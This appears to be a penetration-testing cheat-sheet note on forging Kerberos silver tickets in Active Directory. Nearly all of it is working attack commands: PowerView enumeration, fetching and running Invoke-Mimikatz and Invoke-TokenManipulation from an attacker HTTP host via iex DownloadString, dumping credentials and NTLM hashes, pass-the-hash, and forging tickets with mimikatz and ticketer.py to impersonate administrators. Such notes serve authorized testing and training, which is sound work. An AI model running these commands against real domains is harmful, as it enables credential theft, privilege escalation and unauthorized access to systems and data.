---
title: Silver Ticket
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
Create a valid Service Ticket for a specific service account when the password hash of the service is obtained (or the plaintext password). They provide access to all resources and servers where the SPN is used. There is no need to interact with the KDC for creating the service ticket.

> [!Requirements]
> - SPN password hash: if the target service operates under a user account context, the password hash of the service account is required (for example MSSQL service).
> - If the target service is hosted by the computer itself, the computer account password hash is required (for example Common Internet File System (CIFS) service which is used by the Windows File Share)
> - Domain SID
> - Target SPN

Steps:
1. Domain Enumeration:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1

+ DOMAIN ENUMERATION +
PS> Get-Domain (check the current domain and DC)
DC = prod.research.SECURITY.local
PS> Get-DomainSID (save the domain SID)
SID = S-1-5-21-1693200156-3137632808-1858025440
C:\> whoami /user
DOMAIN_SID-USER_RID

PS> Find-LocalAdminAccess (find systems within the current domain where the current user we have access to has local admin access)

PS> Enter-PSSession SYSTEM_FQDN (access the system we have admin rights)
PS [remote]> whoami /priv (check admin privileges)

*host an http server or hfs with Invoke-TokenManipulation.ps1 and Invoke-Mimikatz.ps1*
PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-TokenManipulation.ps1')
PS [remote]> Invoke-TokenManipulation -Enumerate (enumerate all tokens we have available)
*check users that are loged on*
PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1')
PS [remote]> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' (dump NTLM hashes of all loged in users)
```

We need to find a computer account password hash for the target system to generate the silver ticket.

2. Perform PTH to gain domain admin privileges (privileged PSH is required):
```powershell
*Open a new privileged PS window*
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:ADMIN_USER /domain:DOMAIN_FQDN /ntlm:USER_NTLM_HASH /run:powershell.exe"'
```

2. Find the computer account password hash for the target system (DC): 
```powershell
PS [domain admin session]> powershell -ep bypass
PS [domain admin session]> . .\Invoke-Mimikatz.ps1
PS [domain admin session]> Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName TARGET_FQDN
*copy the "Hash NTLM" field for the user PROD$*
NTLM: 848dfaa9b8ed2f2b2761f5c8138653d6
TARGET_FQDN: target system where we want to generate the silver ticket (typically a Web server or SQL server or DC)
```

3. Generate the silver ticket and inject it:
```powershell
Open a new PS window
PS> ls \\TARGET_SYSTEM_FQDN\c$ (we should not have access)
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1

Normal SPN Silver ticket:
mimikatz # kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN_FQDN /ptt /target:TARGET_SYSTEM_FQDN /service:SPN_PROTOCOL /rc4:NTLM_HASH /user:DOMAIN_USER

DC Silver ticket:
PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN_FQDN /sid:DOMAIN_SID /target:TARGET_SYSTEM_FQDN /service:CIFS /rc4:NTLM_HASH /user:ADM_USER /ptt"'
ADM_USER: administrator
TARGET_SYSTEM_FQDN: DC FQDN

Parameters:
/sid: domain SID
/domain: domain FQDN
/ptt: inject the forged ticket into the memory of the machine we execute the command
/target: target FQDN where the SPN runs
/service: SPN protocol or service we want to access (HTTP, CIFS, ...)
/rc4: NTLM hash of the SPN
/user: any domain user we want (it will be set in the forged service ticket so we can impersonate admin users to gain more privileges)

PS> klist (verify we have the ticket)
PS> ls \\TARGET_SYSTEM_FQDN\c$ (we should be able to access the target)
PS> iwr -UseDefaultCredentials http://TARGET_SYSTEM_CN
PS> iwr -UseDefaultCredentials http://TARGET_SYSTEM_CN | select -ExpandProperty Content
```

Example: if we want to access IIS:
```powershell
1. Try to access the web server:
PS C:\> iwr -UseDefaultCredentials http://web04 # unauthorization

2. Look for a server where we have admin privileges and iis_service has a session on (loged in) to dump his NTLM hash

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

3. Get the Domain SID:
PS C:\> whoami /user
DOMAIN_SID-USER_RID

4. Get the target SPN:
Use one of the commands from AD Enumeration or if we know what to access:
SPN = HTTP/web04.corp.com:80 (web page on IIS)

5. Forge the Silver Ticket:
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

6. Access the web service:
iwr -UseDefaultCredentials http://web04
```

# From Linux (recommended)

1. Import Active Directory:
```powershell
Import-Module ActiveDirectory  
```

2. Get Domain SID:
```powershell
Get-ADDomain
```

3. Get target SPN (for kerberoastable account):
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

4. If we have the NTLM hash of the target user dont do anything, in other case, we have to convert it to NTLM hash:
```bash
echo -n 'PASSWORD' | iconv -t UTF-16LE | openssl md4
```

5. Generate the silver ticket:
```bash
ticketer.py -nthash TARGET_NTLM_PASSWORD_HASH -domain-sid DOMAIN_SID -domain DOMAIN_FQDN -spn TARGET_SPN -user-id 500 Administrator
```

6. Export ccache file:
```
export KRB5CCNAME=PATH_TO_USER.ccache
```

7. Install krb5-user:
```bash
$ sudo apt install krb5-user
```

8. Adjust `/etc/krb5.conf`:
```
[libdefaults]  
default_realm = DOMAIN_FQDN 
  
# The following krb5.conf variables are only for MIT Kerberos.  
kdc_timesync = 1  
ccache_type = 4  
forwardable = true  
proxiable = true  
rdns = false  
  
  
# The following libdefaults parameters are only for Heimdal Kerberos.  
fcc-mit-ticketflags = true  
  
[realms]  
DOMAIN_FQDN = {  
kdc=DC_FQDN  
}  
  
[domain_realm]  
.DOMAIN_FQDN = DOMAIN_FQDN
```

or:

```
[libdefaults]  
default_realm = TARGET_DOMAIN  
kdc_timesync = 1  
ccache_type = 4  
forwardable = true  
proxiable = true  
rdns = false  
dns_canonicalize_hostname = false  
fcc-mit-ticketflags = true  
  
[realms]  
NAGOYA-INDUSTRIES.COM = {  
kdc = DC_FQDN  
}  
  
[domain_realm]  
.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

9. Connect to the target using kerberos auth:
```
$ impacket-mssqlclient -q TARGET
```